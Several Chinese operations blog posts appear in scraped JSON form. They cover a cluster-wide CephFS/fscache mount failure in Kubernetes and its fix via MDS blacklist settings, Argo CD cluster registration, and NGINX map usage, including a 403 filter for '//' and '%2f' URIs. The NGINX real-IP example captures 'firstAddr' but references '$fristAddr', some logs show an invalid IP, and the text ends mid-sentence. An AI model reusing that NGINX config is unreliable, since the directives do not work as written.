kubernetes 环境中，使用 cephfs 时当启用了 fscache 时，由于网络问题，或者 ceph 集群问题导致的整个 k8s 集群规模的挂载故障问题。\n结合fscache的kubernetes中使用cephfs造成的集群规模故障 在了解了上面的基础知识后，就可以引入故障了，下面是故障产生环境的配置\n故障发生环境 软件 版本 Centos 7.9 Ceph nautilus (14.20) Kernel 4.18.16 故障现象 在 k8s 集群中挂在 cephfs 的场景下，新启动的 Pod 报错无法启动，报错信息如下\nContainerCannotRun: error while creating mount source path /var/lib/kubelet/pods/5446c441-9162-45e8-0e93-b59be74d13b/volumes/kubernetesio-cephfs/{dir name} mkcir /var/lib/kubelet/pods/5446c441-9162-45e8-de93-b59bte74d13b/volumes/kubernetes.io~cephfs/ip-ib file existe 主要表现的现象大概为如下三个特征\n对于该节点故障之前运行的 Pod 是正常运行，但是无法写入和读取数据\n无法写入数据 permission denied\n无法读取数据\nkublet 的日志报错截图如下\n彻底解决方法 需要驱逐该节点上所有挂在 cephfs 的 Pod，之后新调度来的 Pod 就可以正常启动了\n故障的分析 当网络出现问题时，如果使用了 cephfs 的 Pod 就会出现大量故障，具体故障表现方式有下面几种\n新部署的 Pod 处于 Waiting 状态\n新部署的 Pod 可以启动成功，但是无法读取 cephfs 的挂载目录，主要故障表现为下面几种形式：\nceph mount error 5 = input/output error [3] cephfs mount failure.permission denied 旧 Pod 无法被删除\n新部署的 Pod 无法启动\n注：上面故障引用都是在网络上找到相同报错的一些提示，并不完全切合本文中故障描述\n去对应节点查看节点内核日志会发现有下面几个特征\n图1：故障发生的节点报错 图2：故障发生的节点报错 图3：故障发生的节点报错 [ 1815.029831] ceph: mds0 closed our session [ 1815.029833] ceph: mds0 reconnect start [ 1815.052219] ceph: mds0 reconnect denied [ 1815.052229] ceph: dropping dirty Fw state for ffff9d9085da1340 1099512175611 [ 1815.052231] ceph: dropping dirty+flushing Fw state for ffff9d9085da1340 1099512175611 [ 1815.273008] libceph: mds0 10.99.10.4:6801 socket closed (con state NEGOTIATING) [ 1816.033241] ceph: mds0 rejected session [ 1829.018643] ceph: mds0 hung [ 1880.088504] ceph: mds0 came back [ 1880.088662] ceph: mds0 caps renewed [ 1880.094018] ceph: get_quota_realm: ino (10000000afe.fffffffffffffffe) null i_snap_realm [ 1881.100367] ceph: get_quota_realm: ino (10000000afe.fffffffffffffffe) null i_snap_realm [ 2046.768969] conntrack: generic helper won't handle protocol 47. Please consider loading the specific helper module. [ 2061.731126] ceph: get_quota_realm: ino (10000000afe.fffffffffffffffe) null i_snap_realm 故障分析 由上面的三张图我们可以得到几个关键点\nconnection reset session lost, hunting for new mon ceph: get_quota_realm() reconnection denied mds1 hung mds1 caps stale 这三张图上的日志是一个故障恢复的顺序，而问题节点（通常为整个集群 Node）内核日志都会在刷 ceph: get_quota_realm() 这种日志，首先我们需要确认第一个问题，ceph: get_quota_realm() 是什么原因导致，在互联网上找了一个 linux kernel 关于修复这个问题的提交记录，通过 commit，我们可以看到这个函数产生的原因\nget_quota_realm() enters infinite loop if quota inode has no caps. This can happen after client gets evicted. [4]\n这里可以看到，修复的内容是当客户端被驱逐时，这个函数会进入无限 loop ，当 inode 配额没有被授权的用户，常常发生在客户端被驱逐。\n通过这个 commit，我们可以确定了后面 4 - 6 问题的疑问，即客户端被 ceph mds 驱逐（加入了黑名单），在尝试重连时就会发生 reconnection denied 接着发生陈腐的被授权认证的用户 (caps stale)。接着由于本身没有真实的卸载，而是使用了一个共享的 cookie 这个时候就会发生节点新挂载的目录是没有权限写，或者是 input/output error 的错误，这些错误表象是根据不同情况下而定，比如说被拉黑和丢失的会话。\nkubelet的错误日志 此时当新的使用了 volumes 去挂载 cephfs时，由于旧的 Pod 产生的工作目录 (/var/lib/kubelet) 下的 Pod 挂载会因为 cephfs caps stale 而导致无法卸载，这是就会存在 “孤儿Pod”，“不能同步 Pod 的状态”，“不能创建新的Pod挂载，因为目录已存在”。\nkubelet 日志如下所示：\nkubelet_volumes.go:66] pod \u0026quot;5446c441-9162-45e8-e11f46893932\u0026quot; found, but error stat /var/lib/kubelet/pods/5446c441-9162-45e8-e11f46893932/volumes/kubernetes.io~cephfs/xxxxx: permission denied occurred during checking mounted volumes from disk pod_workers.go:119] Error syncing pod \u0026quot;5446c441-9162-45e8-e11f46893932\u0026quot; (\u0026quot;xxxxx-xxx-xxx-xxxx-xxx_xxxxx(5446c441-9162-45e8-e11f46893932)\u0026quot;, skipping: failed to \u0026quot;StartContainer\u0026quot; for \u0026quot;xxxxx-xxx-xxx\u0026quot; with RunContainerError: \u0026quot;failed to start container \\\u0026quot;719346531es654113s3216e1456313d51as132156\\\u0026quot;: Error response from daemon: error while createing mount source path '/var/lib/kubelet/pods/5446c441-9162-45446c441-9162-45e8-e11f46893932/volumes/kubernetes.io~cephfs/xxxxxx-xx': mkdir /var/lib/kubelet/pods/5446c441-9162-45446c441-9162-45e8-e11f46893932/volumes/kubernetes.io~cephfs/xxxxxx-xx: file exists\u0026quot; 问题复现 操作步骤，手动删除掉这个节点的会话复现问题：\n操作前日志\nNov 09 15:16:01 node88.itnet.com kernel: libceph: mon0 192.168.20.299:6789 session established Nov 09 15:16:01 node88.itnet.com kernel: libceph: mon0 192.168.20.299:6789 socket closed (con state OPEN) Nov 09 15:16:01 node88.itnet.com kernel: libceph: mon0 192.168.20.299:6789 session lost, hunting for new mon Nov 09 15:16:01 node88.itnet.com kernel: libceph: mon1 10.240.20.134:6789 session established Nov 09 15:16:01 node88.itnet.com kernel: libceph: client176873 fsid bf9495f9-726d-42d3-ac43-53938496bb29 步骤一：查找客户端id\n$ ceph tell mds.0 client ls|grep 22.70 2023-11-09 18:07:37.063 7f204dffb700 0 client.177035 ms_handle_reset on v2:192.168.20.299:6800/1124232159 2023-11-09 18:07:37.089 7f204effd700 0 client.177041 ms_handle_reset on v2:192.168.20.299:6800/1124232159 \u0026quot;addr\u0026quot;: \u0026quot;10.240.22.70:0\u0026quot;, \u0026quot;inst\u0026quot;: \u0026quot;client.176873 v1:10.240.22.70:0/144083785\u0026quot;, 步骤二：驱逐该客户端\n[ root@node209 18:08:21 Thu Nov 09 ~ ] #ceph tell mds.0 client evict id=176873 2023-11-09 18:09:13.726 7fc3cffff700 0 client.177074 ms_handle_reset on v2:192.168.20.299:6800/1124232159 2023-11-09 18:09:14.790 7fc3d97fa700 0 client.177080 ms_handle_reset on v2:192.168.20.299:6800/1124232159 步骤三：检查客户端\n查看日志，与 Openstack 全机房故障出现时日志内容一致\nNov 09 18:09:14 node88.itnet.com kernel: libceph: mds0 192.168.20.299:6801 socket closed (con state OPEN) Nov 09 18:09:16 node88.itnet.com kernel: libceph: mds0 192.168.20.299:6801 connection reset Nov 09 18:09:16 node88.itnet.com kernel: libceph: reset on mds0 Nov 09 18:09:16 node88.itnet.com kernel: ceph: mds0 closed our session Nov 09 18:09:16 node88.itnet.com kernel: ceph: mds0 reconnect start Nov 09 18:09:16 node88.itnet.com kernel: ceph: mds0 reconnect denied Nov 09 18:09:20 node88.itnet.com kernel: libceph: mds0 192.168.20.299:6801 socket closed (con state NEGOTIATING) Nov 09 18:09:21 node88.itnet.com kernel: ceph: mds0 rejected session Nov 09 18:09:21 node88.itnet.com kernel: ceph: mds1 rejected session Nov 09 18:09:21 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:09:21 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:15:21 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:15:21 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:21:21 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:21:21 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:27:22 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:27:22 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:33:22 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:33:22 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:39:23 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:39:23 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:45:23 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:45:23 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:51:24 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:51:24 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:57:24 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm Nov 09 18:57:24 node88.itnet.com kernel: ceph: get_quota_realm: ino (10000000006.fffffffffffffffe) null i_snap_realm 问题如何解决 首先上面我们阐述了问题出现背景以及原因，要想解决这些错误，要分为两个步骤：\n首先驱逐 Kubernetes Node 节点上所有挂载 cephfs 的 Pod，这步骤是为了优雅的结束 fscache 的 cookie cache 机制，使节点可以正常的提供服务 解决使用 fscache 因网络问题导致的会话丢失问题的重连现象 这里主要以步骤2来阐述，解决这个问题就是通过两个方式，一个是不使用 fscache，另一个则是不让 mds 拉黑客户端，关闭 fscache 的成本很难，至今没有尝试成功，这里通过配置 ceph 服务使得 ceph mds 不会拉黑因出现网络问题丢失连接的客户端。\nceph 中阐述了驱逐的概念 “当某个文件系统客户端不响应或者有其它异常行为时，有必要强制切断它到文件系统的访问，这个过程就叫做驱逐。” [5]\n问题的根本原因为：ceph mds 把客户端拉入了黑名单，缓存导致客户端无法卸载连接，但接入了 fscache 的概念导致旧 session 无法释放，新连接会被 reject。\n要想解决这个问题，ceph 提供了一个参数来解决这个问题，mds_session_blacklist_on_timeout\nIt is possible to respond to slow clients by simply dropping their MDS sessions, but permit them to re-open sessions and permit them to continue talking to OSDs. To enable this mode, set mds_session_blacklist_on_timeout to false on your MDS nodes. [6]\n最终在配置后，上述问题解决\n解决问题后测试故障是否存在 测试过程\nceph 参数的配置\n图4：故障发生的节点报错 操作驱逐 xx.70 的客户端连接，用以模拟 ceph 运行的底层出现故障而非正常断开 session 的场景\n图5：驱逐客户端的操作 重新运行 Pod 检查 session 是缓存还是会重连\n图6：检查节点日志 附：ceph mds 管理客户端 查看一个客户端的连接\nceph daemon mds.xxxxxxxx session ls |grep -E 'inst|hostname|kernel_version'|grep xxxx \u0026quot;inst\u0026quot;: \u0026quot;client.105123 v1:192.168.0.0:0/11243531\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;xxxxxxxxxxxxxxxxxx\u0026quot; 手动驱逐一个客户端\nceph tell mds.0 client evict id=105123 2023-11-12 13:25:23:381 7fa3a67fc700 0 client.105123 ms_handle_reset on v2:192.168.0.0:6800/112351231 2023-11-12 13:25:23:421 7fa3a67fc700 0 client.105123 ms_handle_reset on v2:192.168.0.0:6800/112351231 查看 ceph 的配置参数\nceph config dump WHO MASK LEVEL OPTION VALUE RO mon advanced auth_allow_insecure_global_id_reclaim false mon advanced mon_allow_pool_delete false mds advanced mds_session_blacklist_on_evict false mds advanced mds_session_blacklist_on_timeout false 当出现问题无法卸载时应如何解决？\n当我们遇到问题时，卸载目录会出现被占用情况，通过 mount 和 fuser 都无法卸载\numount -f /tmp/998 umount： /tmp/998: target is buy. (In some cases useful info about processes that use th device is found by losf(8) or fuser(1)) the device is found by losf(8) or fuser(1) fuser -v1 /root/test Cannot stat /root/test: Input/output error 这个时候由于 cephfs 挂载问题会导致整个文件系统不可用，例如 df -h, ls dir 等，此时可以使用 umount 的懒卸载模式 umount -l，这会告诉内核当不占用时被卸载，由于这个问题是出现问题，而不是长期占用，这里用懒卸载后会立即卸载，从而解决了 stuck 的问题。\n什么是fscache fscache 是网络文件系统的通用缓存，例如 NFS, CephFS都可以使用其进行缓存从而提高 IO\nFS-Cache是在访问之前，将整个打开的每个 netfs 文件完全加载到 Cache 中，之后的挂载是从该缓存而不是 netfs 的 inode 中提供\nfscache主要提供了下列功能：\n一次可以使用多个缓存 可以随时添加/删除缓存 Cookie 分为 “卷”, “数据文件”, “缓存” 缓存 cookie 代表整个缓存，通常不可见到“网络文件系统” 卷 cookie 来表示一组 文件 数据文件 cookie 用于缓存数据 下图是一个 NFS 使用 fscache 的示意图，CephFS 原理与其类似\n图7：FS-Cache 架构 Source：https://computingforgeeks.com/how-to-cache-nfs-share-data-with-fs-cache-on-linux/\nCephFS 也是可以被缓存的一种网络文件系统，可以通过其内核模块看到对应的依赖\nroot@client:~# lsmod | grep ceph ceph 376832 1 libceph 315392 1 ceph fscache 65536 1 ceph libcrc32c 16384 3 xfs,raid456,libceph root@client:~# modinfo ceph filename: /lib/modules/4.15.0-112-generic/kernel/fs/ceph/ceph.ko license: GPL description: Ceph filesystem for Linux author: Patience Warnick \u0026lt;patience@newdream.net\u0026gt; author: Yehuda Sadeh \u0026lt;yehuda@hq.newdream.net\u0026gt; author: Sage Weil \u0026lt;sage@newdream.net\u0026gt; alias: fs-ceph srcversion: B2806F4EAACAC1E19EE7AFA depends: libceph,fscache retpoline: Y intree: Y name: ceph vermagic: 4.15.0-112-generic SMP mod_unload signat: PKCS#7 signer: sig_key: sig_hashalgo: md4 在启用了fs-cache后，内核日志可以看到对应 cephfs 挂载时 ceph 被注册到 fscache中\n[ 11457.592011] FS-Cache: Loaded [ 11457.617265] Key type ceph registered [ 11457.617686] libceph: loaded (mon/osd proto 15/24) [ 11457.640554] FS-Cache: Netfs 'ceph' registered for caching [ 11457.640558] ceph: loaded (mds proto 32) [ 11457.640978] libceph: parse_ips bad ip 'mon1.ichenfu.com:6789,mon2.ichenfu.com:6789,mon3.ichenfu.com:6789' 当 monitor / OSD 拒绝连接时，所有该节点后续创建的挂载均会使用缓存，除非 umount 所有挂载后重新挂载才可以重新与 ceph mon 建立连接\ncephfs 中的 fscache ceph 官方在 2023年11月5日的一篇博客 [1] 中介绍了，cephfs 与 fscache 结合的介绍。这个功能的加入最显著的成功就是 ceph node 流向 OSD 网络被大大减少，尤其是在读取多的情况下。\n这个机制可以在代码 commit 中看到其原理：“在第一次通过文件引用inode时创建缓存cookie。之后，直到我们处理掉inode，我们都不会摆脱cookie” [2]\nReference [1] First Impressions Through Fscache and Ceph\n[2] ceph: persistent caching with fscache\n[3] Cannot Mount CephFS No Timeout, mount error 5 = Input/output error\n[4] ceph: fix infinite loop in get_quota_realm()\n[5] Ceph 文件系统客户端的驱逐\n[6] advanced-configuring-blacklisting\n","permalink":"https://www.oomkill.com/2023/11/10-1-ceph-fscache/","summary":"","title":"当cephfs和fscache结合时在K8s环境下的全集群规模故障"},{"content":"登录argo cd argocd login argocd_server:argocd_port_here 执行后输入admin/sercert\n$ argocd login 10.0.0.5:30908 WARNING: server certificate had error: x509: cannot validate certificate for 10.0.0.5 because it doesn't contain any IP SANs. Proceed insecurely (y/n)? y Username: admin Password: 'admin:login' logged in successfully Context '10.0.0.5:30908' updated argocd cli 登录后的文件保存在 ~/.argocd/config 中\n注册一个新集群 argocd 通过 kubectl 来获取集群的信息，所以 argocd 的主机上必须有 kubeconfig 文件\nNote: KUBECONFIG 文件地址必须为实际路径，比如 ~/ 这种方式不可以\nexport KUBECONFIG=\u0026quot;/root/admin.conf\u0026quot; 从 kubeconfig 中提取当前集群的上下文名称\nkubectl config get-contexts -o name 向 argo 添加 kubernetes 集群\n$ argocd cluster add k8s-admin@kubernetes INFO[0000] ServiceAccount \u0026quot;argocd-manager\u0026quot; created in namespace \u0026quot;kube-system\u0026quot; INFO[0000] ClusterRole \u0026quot;argocd-manager-role\u0026quot; created INFO[0000] ClusterRoleBinding \u0026quot;argocd-manager-role-binding\u0026quot; created Cluster 'https://10.0.0.4:6443' added 现在可以执行 argocd 命令来列出 argo 中的所有集群，这是为了验证 argocd-cluster 是否已成功添加\n$ argocd cluster list SERVER NAME VERSION STATUS MESSAGE https://10.0.0.4:6443 k8s-admin@kubernetes Unknown Cluster has no application and not being monitored. https://kubernetes.default.svc in-cluster Unknown Cluster has no application and not being monitored. 删除一个集群 命令 argocd cluster rm 用于从 argo server 中移除一个集群，例如\nargocd cluster rm https://12.34.567.89 argocd cluster rm cluster-name 需要注意的是 in-cluster 集群是 argo 运行的集群，不能够被删除，如果不使用这个集群，需要修改配置 cluster.inClusterEnabled\n# cluster.inClusterEnabled indicates whether to allow in-cluster server address. This is enabled by default. cluster.inClusterEnabled: \u0026quot;true\u0026quot; 这个配置是在 argocd-cm 中保存的，可以在对应的 configMap 中添加，完整的 argocd 配置见附录1\nkubectl get cm argocd-cm -o yaml apiVersion: v1 data: cluster.inClusterEnabled: \u0026quot;false\u0026quot; kind: ConfigMap metadata: labels: app.kubernetes.io/name: argocd-cm app.kubernetes.io/part-of: argocd name: argocd-cm namespace: default Reference [1] docs/operator-manual/argocd-cm.yaml\n[2] Getting started with multi-cluster K8S deployments using Argo CD\n","permalink":"https://www.oomkill.com/2023/11/ch03-argo-add-cluster/","summary":"","title":"初识Argo cd - 注册/删除k8s集群"},{"content":"在安装和注册集群完成后，就需要引入第一个概念 “Application”（如何管理所有我的应用程序？）\n什么是 Application 什么是 ArgoCD “Application”？ 对于 ArgoCD “Application”的快速解释：它是托管 ArgoCD 部署的 Kubernetes 集群 CRD 包含了应用程序的所有设置，如：\n要部署到哪个集群？ 与哪个 Git 存储库进行同步？ 其他部署设置 应用程序的 YAML 包含了部署您的存储库资源所需的所有信息，充当了在 ArgoCD 中管理应用程序的关键控制点。\nReference [1] docs/operator-manual/argocd-cm.yaml\n[2] Getting started with multi-cluster K8S deployments using Argo CD\n[3] https://medium.com/notive/managing-argocd-application-resources-1b2b4742ab90\n","permalink":"https://www.oomkill.com/2023/11/ch04-application/","summary":"","title":"深入Argo - Application resources"},{"content":"引言 在 NGINX 中常用一种 “比较变量” 的手法，在编程语言中称为 “多路分支” (Case statement)，也就是 nginx map，需要注意的一点是，太低版本 NGINX MAP 中只能使用单变量\nBefore version 0.9.0 only a single variable could be specified in the first parameter. [1]\n下面将了解下 nginx map 的具体使用方式\nnginx map使用 Nginx 配置主要是声明性的，这同样应用于 MAP 指令，NGINX MAP 是定义在 http{} 级别，最大的特点是仅在引用时进行处理， 如果请求未触及使用 NGINX MAP 变量的配置部分，则不会执行该 map 变量查找。换句话来理解，当在上下文 server, Location, if 等中使用结果变量时（指定的不是计算结果，而是在需要时计算该结果的公式），才会被使用，在 NGINX 需要使用该变量之前，NGINX MAP 不会给请求增加任何开销。\nNGINX MAP 用于根据另一个变量的值创建一个变量，如下所示：\nmap $variable_to_check $variable_to_set { \u0026quot;check_if_variable_matches_me\u0026quot; \u0026quot;variable_matches_checked_value\u0026quot;; default \u0026quot;no_match\u0026quot;; } 在上面的例子中， 变量 $variable_to_set 的被设置的结果为：如果 $variable_to_check 值为 “check_if_variable_matches_me”， 那么 $variable_to_set 将被设置为值 “variable_matches_checked_value” ， 否则将设置为 “no_match”。\n上面的就是一个编程语言的分支语句，例如将上面语句转换为 bash shell，那么意思为\nif [ \u0026quot;$variable_to_check\u0026quot; == \u0026quot;check_if_variable_matches_me\u0026quot; ]; then variable_to_set=\u0026quot;variable_matches_checked_value\u0026quot; else variable_to_set=\u0026quot;no_match\u0026quot; fi 当然作为分支语句，是支持多路分支的，他的写法如下：\nmap $thing $useful_variable { \u0026quot;thing_matches_me\u0026quot; \u0026quot;thing_matched_1\u0026quot;; \u0026quot;nope_thing_matches_me\u0026quot; \u0026quot;thing_matched_2\u0026quot;; default \u0026quot;no_match\u0026quot;; } 正则表达式在map中特性 正则表达式 (regular expression） 是一种用于匹配源变量中复杂字符串模式的有用方法，但它会增加解析表达式的开销。默认情况下，NGINX MAP 指令在每个请求处理过程中只执行一次查找，即正则表达式的开销被限制为一次查找。但启用 \u0026ldquo;volatile\u0026rdquo; 参数会关闭变量缓存，这意味着每次使用 NGINX MAP 时都需要执行一次完整查找，从而增加了请求的额外开销，尤其是在高负载情况下，特别是当使用正则表达式时，可能会导致性能下降。\n另外 \u0026ldquo;volatile\u0026rdquo; 参数的副作用是关闭了依赖于 \u0026ldquo;volatile\u0026rdquo; MAP 变量的缓存。如果需要复杂的正则表达式，那么在 MAP 中不要使用 \u0026ldquo;volatile\u0026rdquo; 参数，如果关联的 MAP 变量或任何依赖于该 MAP 的变量在多个地方被引用。这种情况在流量增加并导致查找操作增多时才会变得明显，此时CPU利用率会升高；最重要的是要注意，CPU利用率上升的原因可能不明显，因此需要谨慎使用 \u0026ldquo;volatile\u0026rdquo; 参数。\nvolatile 在计算机中的术语是 “易失性”，例如IP 地址暂时保存在Web 服务器的 易失性 存储器中；随后将被立即删除\n使用正则表达式检查漏洞接口 这里提出一个关于正则表达式的示例 “用于验证某些输入数据” 将其代理到一个有漏洞的后端服务器的 URI 中包含 \u0026ldquo;//\u0026rdquo; 字符，从而绕过了某些安全保护措施，观察到的模式符合以下格式，\u0026quot;//api/product\u0026quot; 或 \u0026ldquo;/api//product\u0026rdquo;。此外，在某些时间点会出现周期性的请求峰值，URI 中包含 \u0026ldquo;%2f\u0026rdquo; 或 \u0026ldquo;%2F\u0026rdquo;，类似这样：\u0026quot;/api%2Fproduct\u0026quot; 或 \u0026ldquo;%2fapi/product\u0026rdquo;。这些模式可以使用带有正则表达式的 MAP 来匹配，并可以在安全规则中使用 MAP 变量。\n使用到的匹配模式包含内置变量 $uri （不包含请求参数），这个参数可以用于上面提到的案例来做风险过滤，因为使用 $uri 来构建匹配规则看起来很适合。然而，这里存在一个问题，即 NGINX 可能会在请求处理的执行阶段修改或规范化 $uri 的值，这可能导致匹配规则不会匹配实际发送的 URI。\n规范化编码：NGINX 在规范化 $uri 时可能会解码其中的特殊字符。例如，%2f 可能被解码为 /，这意味着匹配规则很将不会匹配实际的编码。\n这里建议使用 NGINX 变量 $request_uri 来构建匹配器，而不是 $uri，以确保准确匹配请求的 URI，同时保留查询字符串。$request_uri 是一个 NGINX 内置变量，包含了请求的完整 URI，包括查询字符串。与之前提到的 $uri 不同，$request_uri 不会在请求处理的执行阶段修改或规范化，因此匹配内容与原请求保持原始不变。\n另外，为了简化处理，可以创建两个不同的 MAP，一个用于匹配实际内容，另一个用于 shun 规则。这种分离方式将允许在其他 MAP 中重复使用包含原始不变 URI 的 $uri_only 变量，如下所示：\nmap $request_uri $uri_only { \u0026quot;~^(?\u0026lt;u\u0026gt;[^\\?]+)\\?(?:.*)?\u0026quot; $u; default $request_uri; } map $uri_only $shun_if_client_is_a_baddy { \u0026quot;~\\/\\/\u0026quot; 1; \u0026quot;~*%2f\u0026quot; 1; default 0; } 在上面示例中，建立了 “分离” 方式的规则，下面是针对这组 map 含义解释：\nmap $request_uri $uri_only 创建了一个 map 将 $request_uri 的值用于匹配和分析\n~：告诉解析器后面的字符串应被解释为正则表达式。 ^：表示正则表达式将从 $request_uri 的字符串值的开头进行匹配。 ^(?\u0026lt;u\u0026gt;...)：这里创建了一个 “命名捕获组”，名为 u，它会匹配括号中的表达式，并将匹配的部分分配给 $u 变量。这个捕获组只在映射内部有效，不能在其他地方使用。 ^(?\u0026lt;u\u0026gt;[^\\?]+)：这部分正则表达式使用方括号来定义捕获的字符，匹配的内容是从开头（^）到第一个问号 ? 之前的所有字符。这样，它捕获了 $request_uri 的未修改部分，即不包括查询字符串的部分。 \\?(?:.*)?：这一部分匹配一个问号 ?，后面跟着一个可选的未捕获组，包含任意数量的任何字符直到字符串的末尾。尽管这部分正则表达式不是必要的，因为前面已经捕获了整个 URI 的未修改部分，但它被添加为完整性和可能的其他情况。 map $uri_only $shun_if_client_is_a_baddy ：这个 map，用于将 $uri_only 的值用于匹配和决定是否将客户端标记为不良客户端。以下是有关这行代码的解释：\n~：告诉解析器后面的字符串应被解释为正则表达式，用于匹配 $uri_only。 \\/\\/：这部分正则表达式匹配 $uri_only 中是否包含两个连续的正斜杠。如果匹配成功，将为 $shun_if_client_is_a_baddy 赋值 \u0026ldquo;1\u0026rdquo;，否则为 \u0026ldquo;0\u0026rdquo;。 ~*：这部分告诉解析器正则表达式应该以不区分大小写的方式进行匹配。 %2f：这部分正则表达式匹配 $uri_only 中是否包含字符串 \u0026ldquo;%2f\u0026rdquo;。如果匹配成功，将为 $shun_if_client_is_a_baddy 赋值 \u0026ldquo;1\u0026rdquo;，否则为 \u0026ldquo;0\u0026rdquo;。 规则应用 要使用上面 map 生效，可以将其放置在 server{} 上（同级），用于执行上述两个 map 并在请求处理阶段的早期触发响应：\nif ($shun_if_client_is_a_baddy = 1) { return 403 'You shall not pass!!!'; } 比较变量 在 NGINX MAP 应用中经常遇到的示例是使用纯 NGINX 指令来比较两个变量是否相等。而在 nginx location 上下文中，并不推荐使用 if [2]，更多情况下执行变量比较通常推荐借助脚本语言来处理，例如下面一个 lua 示例\nlocation /compare { access_by_lua_block { if ngx.var.variable1 == ngx.var.variable2 then ngx.say(\u0026quot;Variables are equal\u0026quot;) else ngx.say(\u0026quot;Variables are not equal\u0026quot;) end } } 但使用脚本语言增加了 NGINX 配置的复杂性以及需要内嵌或在引用单独文件中管理的另一段代码，在这种情况下 map 操作比较两个变量的场景是非常有用的。\n# if delimeter between two variables is ':' map $thing1:$thing2 $do_things_match { \u0026quot;~^([^:]+):\\1$\u0026quot; 1; default 0; } 上面的规则解析如下：\n~：字符告诉解析器后面的字符串应被解释为正则表达式。 ^：这个符号表示正则表达式将从字符串值的开头进行匹配。 ^([^:]+)：这部分正则表达式创建了一个无名捕获组，用于捕获从字符串开头（^）到冒号 : 之前的所有字符（不包含冒号）。这个捕获的内容将被分配给一个名为 \u0026ldquo;\\1\u0026rdquo; 的后向引用变量。 :\\1$：这一部分用于将捕获的内容与 $thing2 变量的值进行比较。 如果 $thing1 和 $thing2 匹配，则这个表达式将被视为匹配（或为真），并将设置一个新的变量 $do_things_match 的值为 \u0026ldquo;1\u0026rdquo;。如果 $thing1 不匹配 $thing2，则表达式不匹配，并将设置 $do_things_match 的值为 \u0026ldquo;0\u0026rdquo;。\n下面是这个示例的一个应用，请求应该具有匹配的查询字符串 $arg_foo 和 X-BAR header\nmap $arg_FOO:$http_x_bar $shun_mismatched_payload { \u0026quot;~^([^:]+):\\1$\u0026quot; 1; default 0; } 那么可以在 server{} 段中增加判断\nif ($shun_mismatched_payload = 1) { return 403 'You shall not pass!!!'; } 真实请求IP的获取 例如通常我们需要在日志中打印用户的真实IP，而这个IP隐藏的很深，通常引用了多个字段，例如\nRemote Address 是nginx与客户端进行TCP连接过程中，获得的客户端真实地址。Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求。 一般情况下，在Envoy作为最外层代理时，此IP为真实的IP客户端IP X-Real-IP 是一个自定义头。X-Real-Ip 通常被 HTTP 代理用来表示与它产生 TCP 连接的设备 IP，这个设备可能是其他代理，也可能是真正的请求端。X-Real-Ip 目前并不属于任何标准，代理和 Web 应用之间可以约定用任何自定义头来传递这个信息。 X-Forwarded-For X-Forwarded-For 是一个扩展头。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP，现在已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC 7239（Forwarded HTTP Extension）标准之中。通常，X-Forwarded-For可被伪造，并且使用CDN会被重写 例如，下面从 CDN 获取真实 IP 的示例\nmap $http_x_connecting_ip $client_vsip { \u0026quot;\u0026quot; $http_x_real_ip; ~^(?P\u0026lt;firstAddr\u0026gt;[0-9\\.]+),?.*$ $fristAddr; } map $client_vsip $client_ydip { \u0026quot;\u0026quot; $http_Incap_client_IP; ~^(?P\u0026lt;firstAddr\u0026gt;[0-9\\.]+),?.*$ $fristAddr; } map $client_ydip $client_ip { \u0026quot;\u0026quot; $http_x_forwarded_for; ~^(?P\u0026lt;firstAddr\u0026gt;[0-9\\.]+),?.*$ $fristAddr; } map $client_ip $clientRealIP { \u0026quot;\u0026quot; $remote_addr; ~^(?P\u0026lt;firstAddr\u0026gt;[0-9\\.]+),?.*$ $fristAddr; } 这个 NGINX 配置示例中包含了一系列的 map 指令，用于创建变量映射，以根据不同的请求头信息来设置一系列变量的值。这些变量之间形成了一种链式映射，最终将请求的真实 IP 地址存储在 $clientRealIP 变量中。让我解释这些映射的作用：\n第一个 MAP 指令： $http_x_connecting_ip 是输入变量，根据请求中的 X-Connecting-IP 头部的值。 $client_vsip 是输出变量，它根据 $http_x_real_ip 或请求头部中的 X-Real-IP 值进行映射。 这个映射检查 $http_x_connecting_ip 的值，如果为空（\u0026quot;\u0026quot;），则将 $http_x_real_ip 的值赋给 $client_vsip，否则根据正则表达式提取 $http_x_connecting_ip 中的 IP 地址，并赋给 $client_vsip。 第二个 MAP 指令： $client_vsip 是输入变量，它是前一个映射的输出。 $client_ydip 是输出变量，它根据 $http_Incap_client_IP 或 $client_vsip 进行映射。 这个映射检查 $client_vsip 的值，如果为空（\u0026quot;\u0026quot;），则将 $http_Incap_client_IP 的值赋给 $client_ydip，否则根据正则表达式提取 $client_vsip 中的 